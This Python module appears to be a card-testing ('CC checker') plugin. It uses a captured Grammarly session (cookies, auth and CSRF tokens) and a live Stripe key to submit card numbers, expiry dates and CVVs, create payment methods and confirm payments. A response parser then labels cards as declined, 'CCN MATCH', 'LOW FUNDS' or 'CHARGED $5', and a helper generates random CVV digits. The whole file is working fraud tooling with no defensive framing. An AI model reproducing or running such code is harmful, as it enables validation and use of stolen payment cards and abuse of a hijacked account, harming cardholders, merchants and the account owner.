import requests
import random
from random import randint
import string
import json
from mills.plugins._helpers.tools import find_between

# from joc.classes.RandUser import RandUser

def dead_one(r, rand_user):
    payload = 'planId=10202009&billingCountryCode=IN&billingZip=23400&billingRegionCode=DL'
    headers = {
        'Host': 'subscription.grammarly.com',
        'Content-Length': '75',
        'Sec-Ch-Ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
        'X-Csrf-Token': 'AABL/H5WbuKDMoie5LsULnpoUGA/TN4lkdH2Og',
        'X-Client-Version': '1.2.19535',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json',
        'X-Client-Type': 'funnel',
        'X-Container-Id': 'emkm7ssjru230d00',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Origin': 'https://www.grammarly.com',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.grammarly.com/upgrade?utm_campaign=funnelOnboarding&utm_medium=internal&utm_source=funnel&selectPlan=Annual',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Cookie': 'gnar_containerId=emkm7ssjru230d00; funnelType=free; _gid=GA1.2.103083219.1680712988; ga_clientId=1755340629.1680712988; _gcl_au=1.1.1005591024.1680712988; _rdt_uuid=1680712992175.9a2e8724-e7db-420d-9b57-61df5523c3ca; grauth=AABL_Abgo7vVq7NSmHoekyjUXs8FYotAGmW61dRT1lSxJo3c0_W0vm6fzp2lwyzAZ5OokOok14c_8YIF; csrf-token=AABL/H5WbuKDMoie5LsULnpoUGA/TN4lkdH2Og; tdi=itpad262pd09wp81t; isGrammarlyUser=true; _fbp=fb.1.1680713125650.838885962; _ga=GA1.2.1755340629.1680712988; _uetsid=f3c6b430d3d011ed98e31bb86c799c19; _uetvid=f3c89270d3d011edbeb4b95fcdafad7b; _ga_CBK9K2ZWWE=GS1.1.1680717017.2.1.1680717176.56.0.0'
    }

    c = r.post('https://subscription.grammarly.com/api/v1/order/individual',
               headers=headers, data=payload)
    data = c.json()['orderUUID']
    return data


def dead_two(r, cc, mes, ano, cvv):
    payload='type=card&card%5Bnumber%5D='+cc+'&card%5Bcvc%5D='+cvv+'&card%5Bexp_month%5D='+mes+'&card%5Bexp_year%5D='+ano+'&guid=7f40ccee-5164-4fdd-b700-605660c8e66bd6bc92&muid=78f32b0b-4d3c-4834-9cee-1097c0058b3c8ce3a9&sid=52d77cf0-dd7f-4d48-bc64-256d2cd5a2bd98410b&pasted_fields=number%2Cexp%2Ccvc&payment_user_agent=stripe.js%2F99e8a7e982%3B%2Bstripe-js-v3%2F99e8a7e982&time_on_page=117817&key=pk_live_51LvTdUGMTOL6iHo4DyNW50CM2pHEyv2LHlN8Qx8MzTEa6hOCtF337RktxVgYU9eMMXoYqRbCBWylJyMj0TEMjz3M00OWZ2ZCRS'
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,ru;q=0.6,zh-CN;q=0.5,zh;q=0.4,tr;q=0.3',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
    }
    d = r.post('https://api.stripe.com/v1/payment_methods',
               headers=headers, data=payload)
    return d.json()

def dead_three(r, order_uuid,session_id,payment_method_id):
    payload = json.dumps({
    "order_uuid": order_uuid,
    "session_id": session_id,
    "stripe": {
        "payment_method_id": payment_method_id
    }
    })
    headers = {
    'Host': 'api.payments.grammarly.com',
    'Content-Length': '162',
    'Sec-Ch-Ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'X-Csrf-Token': 'AABL/H5WbuKDMoie5LsULnpoUGA/TN4lkdH2Og',
    'X-Client-Version': '1.2.19535',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'X-Client-Type': 'funnel',
    'X-Container-Id': 'emkm7ssjru230d00',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Origin': 'https://www.grammarly.com',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://www.grammarly.com/upgrade?utm_campaign=funnelOnboarding&utm_medium=internal&utm_source=funnel&selectPlan=Annual',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Cookie': 'gnar_containerId=emkm7ssjru230d00; funnelType=free; _gid=GA1.2.103083219.1680712988; ga_clientId=1755340629.1680712988; _gcl_au=1.1.1005591024.1680712988; _rdt_uuid=1680712992175.9a2e8724-e7db-420d-9b57-61df5523c3ca; grauth=AABL_Abgo7vVq7NSmHoekyjUXs8FYotAGmW61dRT1lSxJo3c0_W0vm6fzp2lwyzAZ5OokOok14c_8YIF; csrf-token=AABL/H5WbuKDMoie5LsULnpoUGA/TN4lkdH2Og; tdi=itpad262pd09wp81t; isGrammarlyUser=true; _fbp=fb.1.1680713125650.838885962; _ga=GA1.2.1755340629.1680712988; _gat=1; _gat_UA-6331378-16=1; _uetsid=f3c6b430d3d011ed98e31bb86c799c19; _uetvid=f3c89270d3d011edbeb4b95fcdafad7b; _ga_CBK9K2ZWWE=GS1.1.1680717017.2.1.1680717176.56.0.0'
    }
    e = r.post('https://api.payments.grammarly.com/v1/payment/confirm',
               headers=headers, data=payload)
    return e.json()

def generate_random_string(length):
    # Get all the ASCII letters in lowercase and uppercase
    letters = string.ascii_letters
    # Randomly choose characters from letters for the given length of the string
    random_string = ''.join(random.choice(letters) for i in range(length))
    return random_string


def random_cvv_date_exp(n):
    range_start = 10**(n-1)
    range_end = (10**n)-1
    return str(randint(range_start, range_end))


def get_response_progress(text: int):
    res = "□□□□□□□□□□ 0%"
    if text == 10:
        res = "■□□□□□□□□□ 10%"
    elif text == 20:
        res = "■■□□□□□□□□ 20%"
    elif text == 30:
        res = "■■■□□□□□□□ 30%"
    elif text == 40:
        res = "■■■■□□□□□□ 40%"
    elif text == 50:
        res = "■■■■■□□□□□ 50%"
    elif text == 60:
        res = "■■■■■■□□□□ 60%"
    elif text == 70:
        res = "■■■■■■■□□□ 70%"
    elif text == 80:
        res = "■■■■■■■■□□ 80%"
    elif text == 90:
        res = "■■■■■■■■■□ 90%"
    elif text == 100:
        res = "■■■■■■■■■■ 100%"
    return res

def get_response_chk(text: str):
    if "card was declined" in text or 'card_declined' in text or 'The transaction has been declined' in text or 'Processor Declined' in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'DECLINED'
    elif 'Your card number is incorrect' in text or 'Call to a member function attach() on null' in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'DECLINED'
    elif 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV MATCH'
    elif "card has insufficient funds" in text or 'insufficient_funds' in text or 'Insufficient Funds' in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV MATCH'
    elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
        r_text, r_logo, r_respo = "CCN MATCH", "✅", 'CCN Match'
    elif "card does not support this type of purchase" in text or 'transaction_not_allowed' in text or 'Transaction Not Allowed' in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'DECLINED'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'DECLINED'
    elif "card has expired" in text or 'Expired Card' in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'DECLINED'
    elif 'Donation Confirmation' in text or "This page doesn't seem to exist" in text or 'seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "CHARGED $5", "✅", 'CVV MATCH'
    else:
        r_text, r_logo, r_respo = 'UNKOWN RESPONSE', "❌", 'DECLINED'
    r_text1 = text.strip() if text else r_text
    return r_text1, r_logo, r_respo